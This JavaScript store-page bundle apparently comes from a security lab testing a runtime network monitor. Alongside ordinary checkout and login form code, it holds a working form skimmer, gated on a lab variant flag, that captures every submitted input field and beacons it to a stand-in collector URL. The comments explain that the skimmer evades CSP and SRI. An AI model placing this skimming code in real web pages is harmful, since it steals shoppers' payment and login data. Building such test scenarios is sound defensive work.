/*
 * shop.js — FIRST-PARTY page bundle (your own code).
 *
 * Legitimate behaviour: submit the checkout / login form over fetch and show a
 * result line, so the page works like a real store.
 *
 * Round 4 scenario: a poisoned build-time dependency (think the Sept 2025
 * npm worm) ends up bundled INTO this first-party file. Because it ships from
 * your own origin, SRI matches your own build and CSP nonces it like any of
 * your code — neither control fires. Only the runtime monitor, which wraps the
 * network APIs, sees the unexpected call-out. The skim block below is a lab
 * stand-in and only runs when the harness selects the 'firstparty' variant.
 */
(function () {
  "use strict";
  var LAB = window.__LAB || {};

  // ── Legitimate store behaviour ───────────────────────────────────────────
  function wireForm(id) {
    var form = document.getElementById(id);
    if (!form) return;
    form.addEventListener("submit", function (e) {
      e.preventDefault();
      var result = document.getElementById("result");
      fetch(form.action, { method: "POST", body: new FormData(form) })
        .then(function (r) { return r.json(); })
        .then(function (d) { if (result) result.textContent = d.message || "OK"; })
        .catch(function () { if (result) result.textContent = "Network error"; });
    });
  }
  wireForm("checkout-form");
  wireForm("login-form");

  // ── Round 4 lab stand-in: skim shipped inside a first-party bundle ────────
  if (LAB.variant === "firstparty") {
    document.addEventListener("submit", function (e) {
      var fields = {};
      Array.prototype.forEach.call(e.target.querySelectorAll("input"), function (el) {
        if (el.name) fields[el.name] = el.value;
      });
      // First-party code calling a foreign origin: invisible to CSP/SRI,
      // visible to the runtime monitor.
      try {
        navigator.sendBeacon(LAB.collector + "/collect",
          JSON.stringify({ src: "firstparty-bundle", fields: fields }));
      } catch (_) { /* monitor may have neutralised sendBeacon */ }
    }, true);
  }
})();
